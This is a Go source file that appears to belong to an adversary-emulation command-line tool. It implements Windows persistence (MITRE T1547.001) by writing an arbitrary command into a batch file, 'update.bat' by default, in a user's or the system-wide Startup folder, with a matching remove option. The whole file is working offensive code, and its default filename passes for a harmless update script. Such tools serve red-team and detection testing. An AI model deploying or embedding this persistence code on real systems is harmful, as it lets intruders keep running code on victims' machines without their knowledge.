package techniques

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"github.com/spf13/cobra"
)

var (
	// arguments
	user string
	com string
	filename string
	method string
	// cobra
	startupfolderCmd = &cobra.Command{
		Use: "startup",
		Short: "Persistence using the startup folder for either a user or system (T1547.001)",
		Run: startupfolderPersist,
	}
)

func init(){
	rootCmd.AddCommand(startupfolderCmd)
	startupfolderCmd.Flags().StringVarP(&user, "user", "u", "", "Specify the user for startupfolder persistence, or specify SYSTEM for the system startup folder")
	startupfolderCmd.Flags().StringVarP(&filename, "filename", "f", "update.bat", "Filename to be written")
	startupfolderCmd.Flags().StringVarP(&method, "method", "m", "", "Add or remove the persistence technique (add will overwrite the file if it already exists) (required)")
	startupfolderCmd.MarkFlagRequired("method")
	startupfolderCmd.Flags().StringVarP(&com, "command", "c", "", "Command to execute for persistence (required with the add method)")
	if method == "add"{
		startupfolderCmd.MarkFlagRequired("command")
	}
}

func startupfolderPersist(cmd *cobra.Command, args []string){
	var homedir string
	// gets the current user's home directory if a user isn't specified
	if user == ""{
		fmt.Println("[+] Checking the current users's startup folder")
		tempdir,err := os.UserHomeDir()
		if err != nil {
			log.Fatalln(err)
		}
		homedir = tempdir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
		user = "the current user"
	// if system is specified, use the system startup folder
	} else if user == "SYSTEM" {
		fmt.Println("[+] Checking the system's startup folder")
		homedir = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	// else, grab the specified users startup folder
	} else {
		fmt.Printf("[+] Checking %s's startup folder\n",user)
		homedir = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
	}

	// attempts to read the directory to ensure that it exists
	files, err := ioutil.ReadDir(homedir)
	if err != nil {
		log.Fatalln(err)
	}

	// lists the current files in the startup folder
	fmt.Printf("[+] Read %s:\n",homedir)
	for _, f := range files {
		fmt.Println(f.Name())
	}

	// attempts to write the file under the startup folder for persistence
	if method == "add"{
		fmt.Printf("[+] Writing the %s file under %s's startup folder\n", filename, user)
		err = ioutil.WriteFile(homedir + "\\" + filename, []byte(com), 0755)
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Successfully wrote %s\n", filename)

	// attempts to delete the file if remove is provided
	} else if method == "remove"{
		fmt.Printf("[+] Attempting to remove the %s file under %s's startup folder\n",filename,user)
		err = os.Remove(homedir + "\\" + filename)
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Successfully removed the %s file\n", filename)	
	}
}